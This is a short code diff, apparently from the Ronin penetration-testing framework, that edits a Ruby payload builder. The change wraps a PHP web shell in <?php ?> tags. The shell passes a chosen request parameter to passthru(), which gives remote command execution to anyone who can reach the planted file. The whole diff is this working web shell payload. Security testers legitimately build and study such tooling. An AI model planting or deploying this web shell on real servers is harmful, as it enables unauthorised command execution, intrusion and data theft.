@@ -39,7 +39,7 @@ module Ronin
         def build
           query_param_string = params[:query_param].dump
 
-          @payload = %{if(isset($_REQUEST[#{query_param_string})){echo "<exec>";passthru($_REQUEST[#{query_param_string}]);echo "</exec>";}}
+          @payload = %{<?php if(isset($_REQUEST[#{query_param_string})){echo "<exec>";passthru($_REQUEST[#{query_param_string}]);echo "</exec>";}?>}
         end
 
       end
